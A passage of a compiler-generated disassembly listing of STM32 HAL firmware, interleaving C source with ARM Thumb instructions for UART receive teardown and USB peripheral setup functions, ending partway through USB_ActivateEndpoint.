static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005cea:	b480      	push	{r7}
 8005cec:	b095      	sub	sp, #84	; 0x54
 8005cee:	af00      	add	r7, sp, #0
 8005cf0:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005cf2:	687b      	ldr	r3, [r7, #4]
 8005cf4:	681b      	ldr	r3, [r3, #0]
 8005cf6:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005cf8:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005cfa:	e853 3f00 	ldrex	r3, [r3]
 8005cfe:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005d00:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005d02:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005d06:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005d08:	687b      	ldr	r3, [r7, #4]
 8005d0a:	681b      	ldr	r3, [r3, #0]
 8005d0c:	461a      	mov	r2, r3
 8005d0e:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005d10:	643b      	str	r3, [r7, #64]	; 0x40
 8005d12:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d14:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005d16:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005d18:	e841 2300 	strex	r3, r2, [r1]
 8005d1c:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005d1e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005d20:	2b00      	cmp	r3, #0
 8005d22:	d1e6      	bne.n	8005cf2 <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005d24:	687b      	ldr	r3, [r7, #4]
 8005d26:	681b      	ldr	r3, [r3, #0]
 8005d28:	3308      	adds	r3, #8
 8005d2a:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d2c:	6a3b      	ldr	r3, [r7, #32]
 8005d2e:	e853 3f00 	ldrex	r3, [r3]
 8005d32:	61fb      	str	r3, [r7, #28]
   return(result);
 8005d34:	69fb      	ldr	r3, [r7, #28]
 8005d36:	f023 0301 	bic.w	r3, r3, #1
 8005d3a:	64bb      	str	r3, [r7, #72]	; 0x48
 8005d3c:	687b      	ldr	r3, [r7, #4]
 8005d3e:	681b      	ldr	r3, [r3, #0]
 8005d40:	3308      	adds	r3, #8
 8005d42:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005d44:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005d46:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d48:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005d4a:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005d4c:	e841 2300 	strex	r3, r2, [r1]
 8005d50:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005d52:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005d54:	2b00      	cmp	r3, #0
 8005d56:	d1e5      	bne.n	8005d24 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005d58:	687b      	ldr	r3, [r7, #4]
 8005d5a:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005d5c:	2b01      	cmp	r3, #1
 8005d5e:	d118      	bne.n	8005d92 <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005d60:	687b      	ldr	r3, [r7, #4]
 8005d62:	681b      	ldr	r3, [r3, #0]
 8005d64:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d66:	68fb      	ldr	r3, [r7, #12]
 8005d68:	e853 3f00 	ldrex	r3, [r3]
 8005d6c:	60bb      	str	r3, [r7, #8]
   return(result);
 8005d6e:	68bb      	ldr	r3, [r7, #8]
 8005d70:	f023 0310 	bic.w	r3, r3, #16
 8005d74:	647b      	str	r3, [r7, #68]	; 0x44
 8005d76:	687b      	ldr	r3, [r7, #4]
 8005d78:	681b      	ldr	r3, [r3, #0]
 8005d7a:	461a      	mov	r2, r3
 8005d7c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005d7e:	61bb      	str	r3, [r7, #24]
 8005d80:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d82:	6979      	ldr	r1, [r7, #20]
 8005d84:	69ba      	ldr	r2, [r7, #24]
 8005d86:	e841 2300 	strex	r3, r2, [r1]
 8005d8a:	613b      	str	r3, [r7, #16]
   return(result);
 8005d8c:	693b      	ldr	r3, [r7, #16]
 8005d8e:	2b00      	cmp	r3, #0
 8005d90:	d1e6      	bne.n	8005d60 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005d92:	687b      	ldr	r3, [r7, #4]
 8005d94:	2220      	movs	r2, #32
 8005d96:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005d9a:	687b      	ldr	r3, [r7, #4]
 8005d9c:	2200      	movs	r2, #0
 8005d9e:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005da0:	687b      	ldr	r3, [r7, #4]
 8005da2:	2200      	movs	r2, #0
 8005da4:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005da6:	bf00      	nop
 8005da8:	3754      	adds	r7, #84	; 0x54
 8005daa:	46bd      	mov	sp, r7
 8005dac:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005db0:	4770      	bx	lr

08005db2 <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005db2:	b084      	sub	sp, #16
 8005db4:	b480      	push	{r7}
 8005db6:	b083      	sub	sp, #12
 8005db8:	af00      	add	r7, sp, #0
 8005dba:	6078      	str	r0, [r7, #4]
 8005dbc:	f107 0014 	add.w	r0, r7, #20
 8005dc0:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005dc4:	2300      	movs	r3, #0
}
 8005dc6:	4618      	mov	r0, r3
 8005dc8:	370c      	adds	r7, #12
 8005dca:	46bd      	mov	sp, r7
 8005dcc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005dd0:	b004      	add	sp, #16
 8005dd2:	4770      	bx	lr

08005dd4 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005dd4:	b480      	push	{r7}
 8005dd6:	b085      	sub	sp, #20
 8005dd8:	af00      	add	r7, sp, #0
 8005dda:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005ddc:	687b      	ldr	r3, [r7, #4]
 8005dde:	2200      	movs	r2, #0
 8005de0:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005de4:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005de8:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005dea:	68fb      	ldr	r3, [r7, #12]
 8005dec:	b29a      	uxth	r2, r3
 8005dee:	687b      	ldr	r3, [r7, #4]
 8005df0:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005df4:	2300      	movs	r3, #0
}
 8005df6:	4618      	mov	r0, r3
 8005df8:	3714      	adds	r7, #20
 8005dfa:	46bd      	mov	sp, r7
 8005dfc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e00:	4770      	bx	lr

08005e02 <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005e02:	b480      	push	{r7}
 8005e04:	b085      	sub	sp, #20
 8005e06:	af00      	add	r7, sp, #0
 8005e08:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005e0a:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005e0e:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005e10:	687b      	ldr	r3, [r7, #4]
 8005e12:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005e16:	b29a      	uxth	r2, r3
 8005e18:	68fb      	ldr	r3, [r7, #12]
 8005e1a:	b29b      	uxth	r3, r3
 8005e1c:	43db      	mvns	r3, r3
 8005e1e:	b29b      	uxth	r3, r3
 8005e20:	4013      	ands	r3, r2
 8005e22:	b29a      	uxth	r2, r3
 8005e24:	687b      	ldr	r3, [r7, #4]
 8005e26:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005e2a:	2300      	movs	r3, #0
}
 8005e2c:	4618      	mov	r0, r3
 8005e2e:	3714      	adds	r7, #20
 8005e30:	46bd      	mov	sp, r7
 8005e32:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e36:	4770      	bx	lr

08005e38 <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8005e38:	b480      	push	{r7}
 8005e3a:	b083      	sub	sp, #12
 8005e3c:	af00      	add	r7, sp, #0
 8005e3e:	6078      	str	r0, [r7, #4]
 8005e40:	460b      	mov	r3, r1
 8005e42:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8005e44:	2300      	movs	r3, #0
}
 8005e46:	4618      	mov	r0, r3
 8005e48:	370c      	adds	r7, #12
 8005e4a:	46bd      	mov	sp, r7
 8005e4c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e50:	4770      	bx	lr

08005e52 <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005e52:	b084      	sub	sp, #16
 8005e54:	b480      	push	{r7}
 8005e56:	b083      	sub	sp, #12
 8005e58:	af00      	add	r7, sp, #0
 8005e5a:	6078      	str	r0, [r7, #4]
 8005e5c:	f107 0014 	add.w	r0, r7, #20
 8005e60:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 8005e64:	687b      	ldr	r3, [r7, #4]
 8005e66:	2201      	movs	r2, #1
 8005e68:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8005e6c:	687b      	ldr	r3, [r7, #4]
 8005e6e:	2200      	movs	r2, #0
 8005e70:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005e74:	687b      	ldr	r3, [r7, #4]
 8005e76:	2200      	movs	r2, #0
 8005e78:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8005e7c:	687b      	ldr	r3, [r7, #4]
 8005e7e:	2200      	movs	r2, #0
 8005e80:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8005e84:	2300      	movs	r3, #0
}
 8005e86:	4618      	mov	r0, r3
 8005e88:	370c      	adds	r7, #12
 8005e8a:	46bd      	mov	sp, r7
 8005e8c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e90:	b004      	add	sp, #16
 8005e92:	4770      	bx	lr

08005e94 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8005e94:	b480      	push	{r7}
 8005e96:	b083      	sub	sp, #12
 8005e98:	af00      	add	r7, sp, #0
 8005e9a:	6078      	str	r0, [r7, #4]
 8005e9c:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005e9e:	2300      	movs	r3, #0
}
 8005ea0:	4618      	mov	r0, r3
 8005ea2:	370c      	adds	r7, #12
 8005ea4:	46bd      	mov	sp, r7
 8005ea6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005eaa:	4770      	bx	lr

08005eac <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8005eac:	b480      	push	{r7}
 8005eae:	b083      	sub	sp, #12
 8005eb0:	af00      	add	r7, sp, #0
 8005eb2:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005eb4:	2300      	movs	r3, #0
}
 8005eb6:	4618      	mov	r0, r3
 8005eb8:	370c      	adds	r7, #12
 8005eba:	46bd      	mov	sp, r7
 8005ebc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ec0:	4770      	bx	lr
	...

08005ec4 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8005ec4:	b480      	push	{r7}
 8005ec6:	b09d      	sub	sp, #116	; 0x74
 8005ec8:	af00      	add	r7, sp, #0
 8005eca:	6078      	str	r0, [r7, #4]
 8005ecc:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8005ece:	2300      	movs	r3, #0
 8005ed0:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8005ed4:	687a      	ldr	r2, [r7, #4]
 8005ed6:	683b      	ldr	r3, [r7, #0]
 8005ed8:	781b      	ldrb	r3, [r3, #0]
 8005eda:	009b      	lsls	r3, r3, #2
 8005edc:	4413      	add	r3, r2
 8005ede:	881b      	ldrh	r3, [r3, #0]
 8005ee0:	b29b      	uxth	r3, r3
 8005ee2:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 8005ee6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005eea:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 8005eee:	683b      	ldr	r3, [r7, #0]
 8005ef0:	78db      	ldrb	r3, [r3, #3]
 8005ef2:	2b03      	cmp	r3, #3
 8005ef4:	d81f      	bhi.n	8005f36 <USB_ActivateEndpoint+0x72>
 8005ef6:	a201      	add	r2, pc, #4	; (adr r2, 8005efc <USB_ActivateEndpoint+0x38>)
 8005ef8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005efc:	08005f0d 	.word	0x08005f0d
 8005f00:	08005f29 	.word	0x08005f29
 8005f04:	08005f3f 	.word	0x08005f3f
 8005f08:	08005f1b 	.word	0x08005f1b
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 8005f0c:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f10:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8005f14:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f18:	e012      	b.n	8005f40 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 8005f1a:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f1e:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 8005f22:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f26:	e00b      	b.n	8005f40 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8005f28:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f2c:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8005f30:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f34:	e004      	b.n	8005f40 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8005f36:	2301      	movs	r3, #1
 8005f38:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8005f3c:	e000      	b.n	8005f40 <USB_ActivateEndpoint+0x7c>
      break;
 8005f3e:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 8005f40:	687a      	ldr	r2, [r7, #4]
 8005f42:	683b      	ldr	r3, [r7, #0]
 8005f44:	781b      	ldrb	r3, [r3, #0]
 8005f46:	009b      	lsls	r3, r3, #2
 8005f48:	441a      	add	r2, r3
 8005f4a:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f4e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005f52:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005f56:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005f5a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005f5e:	b29b      	uxth	r3, r3
 8005f60:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 8005f62:	687a      	ldr	r2, [r7, #4]
 8005f64:	683b      	ldr	r3, [r7, #0]
 8005f66:	781b      	ldrb	r3, [r3, #0]
 8005f68:	009b      	lsls	r3, r3, #2
 8005f6a:	4413      	add	r3, r2
 8005f6c:	881b      	ldrh	r3, [r3, #0]
 8005f6e:	b29b      	uxth	r3, r3
 8005f70:	b21b      	sxth	r3, r3
 8005f72:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005f76:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005f7a:	b21a      	sxth	r2, r3
 8005f7c:	683b      	ldr	r3, [r7, #0]
 8005f7e:	781b      	ldrb	r3, [r3, #0]
 8005f80:	b21b      	sxth	r3, r3
 8005f82:	4313      	orrs	r3, r2
 8005f84:	b21b      	sxth	r3, r3
 8005f86:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8005f8a:	687a      	ldr	r2, [r7, #4]
 8005f8c:	683b      	ldr	r3, [r7, #0]
 8005f8e:	781b      	ldrb	r3, [r3, #0]
 8005f90:	009b      	lsls	r3, r3, #2
 8005f92:	441a      	add	r2, r3
 8005f94:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8005f98:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005f9c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005fa0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005fa4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005fa8:	b29b      	uxth	r3, r3
 8005faa:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8005fac:	683b      	ldr	r3, [r7, #0]
 8005fae:	7b1b      	ldrb	r3, [r3, #12]
 8005fb0:	2b00      	cmp	r3, #0
 8005fb2:	f040 8178 	bne.w	80062a6 <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 8005fb6:	683b      	ldr	r3, [r7, #0]
 8005fb8:	785b      	ldrb	r3, [r3, #1]
 8005fba:	2b00      	cmp	r3, #0
 8005fbc:	f000 8084 	beq.w	80060c8 <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8005fc0:	687b      	ldr	r3, [r7, #4]
 8005fc2:	61bb      	str	r3, [r7, #24]
 8005fc4:	687b      	ldr	r3, [r7, #4]
 8005fc6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8005fca:	b29b      	uxth	r3, r3
 8005fcc:	461a      	mov	r2, r3
 8005fce:	69bb      	ldr	r3, [r7, #24]
 8005fd0:	4413      	add	r3, r2
 8005fd2:	61bb      	str	r3, [r7, #24]
 8005fd4:	683b      	ldr	r3, [r7, #0]
 8005fd6:	781b      	ldrb	r3, [r3, #0]
 8005fd8:	00da      	lsls	r2, r3, #3
 8005fda:	69bb      	ldr	r3, [r7, #24]
 8005fdc:	4413      	add	r3, r2
 8005fde:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8005fe2:	617b      	str	r3, [r7, #20]
 8005fe4:	683b      	ldr	r3, [r7, #0]
 8005fe6:	88db      	ldrh	r3, [r3, #6]
 8005fe8:	085b      	lsrs	r3, r3, #1
 8005fea:	b29b      	uxth	r3, r3
 8005fec:	005b      	lsls	r3, r3, #1
 8005fee:	b29a      	uxth	r2, r3
 8005ff0:	697b      	ldr	r3, [r7, #20]
 8005ff2:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8005ff4:	687a      	ldr	r2, [r7, #4]
 8005ff6:	683b      	ldr	r3, [r7, #0]
 8005ff8:	781b      	ldrb	r3, [r3, #0]
 8005ffa:	009b      	lsls	r3, r3, #2
 8005ffc:	4413      	add	r3, r2
 8005ffe:	881b      	ldrh	r3, [r3, #0]
 8006000:	827b      	strh	r3, [r7, #18]
 8006002:	8a7b      	ldrh	r3, [r7, #18]
 8006004:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006008:	2b00      	cmp	r3, #0
 800600a:	d01b      	beq.n	8006044 <USB_ActivateEndpoint+0x180>
 800600c:	687a      	ldr	r2, [r7, #4]
 800600e:	683b      	ldr	r3, [r7, #0]
 8006010:	781b      	ldrb	r3, [r3, #0]
 8006012:	009b      	lsls	r3, r3, #2
 8006014:	4413      	add	r3, r2
 8006016:	881b      	ldrh	r3, [r3, #0]
 8006018:	b29b      	uxth	r3, r3
 800601a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800601e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006022:	823b      	strh	r3, [r7, #16]
 8006024:	687a      	ldr	r2, [r7, #4]
 8006026:	683b      	ldr	r3, [r7, #0]
 8006028:	781b      	ldrb	r3, [r3, #0]
 800602a:	009b      	lsls	r3, r3, #2
 800602c:	441a      	add	r2, r3
 800602e:	8a3b      	ldrh	r3, [r7, #16]
 8006030:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006034:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006038:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800603c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006040:	b29b      	uxth	r3, r3
 8006042:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006044:	683b      	ldr	r3, [r7, #0]
 8006046:	78db      	ldrb	r3, [r3, #3]
 8006048:	2b01      	cmp	r3, #1
 800604a:	d020      	beq.n	800608e <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 800604c:	687a      	ldr	r2, [r7, #4]
 800604e:	683b      	ldr	r3, [r7, #0]
 8006050:	781b      	ldrb	r3, [r3, #0]
 8006052:	009b      	lsls	r3, r3, #2
 8006054:	4413      	add	r3, r2
 8006056:	881b      	ldrh	r3, [r3, #0]
 8006058:	b29b      	uxth	r3, r3
 800605a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800605e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006062:	81bb      	strh	r3, [r7, #12]
 8006064:	89bb      	ldrh	r3, [r7, #12]
 8006066:	f083 0320 	eor.w	r3, r3, #32
 800606a:	81bb      	strh	r3, [r7, #12]
 800606c:	687a      	ldr	r2, [r7, #4]
 800606e:	683b      	ldr	r3, [r7, #0]
 8006070:	781b      	ldrb	r3, [r3, #0]
 8006072:	009b      	lsls	r3, r3, #2
 8006074:	441a      	add	r2, r3
 8006076:	89bb      	ldrh	r3, [r7, #12]
 8006078:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800607c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006080:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006084:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006088:	b29b      	uxth	r3, r3
 800608a:	8013      	strh	r3, [r2, #0]
 800608c:	e2d5      	b.n	800663a <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800608e:	687a      	ldr	r2, [r7, #4]
 8006090:	683b      	ldr	r3, [r7, #0]
 8006092:	781b      	ldrb	r3, [r3, #0]
 8006094:	009b      	lsls	r3, r3, #2
 8006096:	4413      	add	r3, r2
 8006098:	881b      	ldrh	r3, [r3, #0]
 800609a:	b29b      	uxth	r3, r3
 800609c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80060a0:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80060a4:	81fb      	strh	r3, [r7, #14]
 80060a6:	687a      	ldr	r2, [r7, #4]
 80060a8:	683b      	ldr	r3, [r7, #0]
 80060aa:	781b      	ldrb	r3, [r3, #0]
 80060ac:	009b      	lsls	r3, r3, #2
 80060ae:	441a      	add	r2, r3
 80060b0:	89fb      	ldrh	r3, [r7, #14]
 80060b2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80060b6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80060ba:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80060be:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80060c2:	b29b      	uxth	r3, r3
 80060c4:	8013      	strh	r3, [r2, #0]
 80060c6:	e2b8      	b.n	800663a <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 80060c8:	687b      	ldr	r3, [r7, #4]
 80060ca:	633b      	str	r3, [r7, #48]	; 0x30
 80060cc:	687b      	ldr	r3, [r7, #4]
 80060ce:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80060d2:	b29b      	uxth	r3, r3
 80060d4:	461a      	mov	r2, r3
 80060d6:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80060d8:	4413      	add	r3, r2
 80060da:	633b      	str	r3, [r7, #48]	; 0x30
 80060dc:	683b      	ldr	r3, [r7, #0]
 80060de:	781b      	ldrb	r3, [r3, #0]
 80060e0:	00da      	lsls	r2, r3, #3
 80060e2:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80060e4:	4413      	add	r3, r2
 80060e6:	f203 4304 	addw	r3, r3, #1028	; 0x404
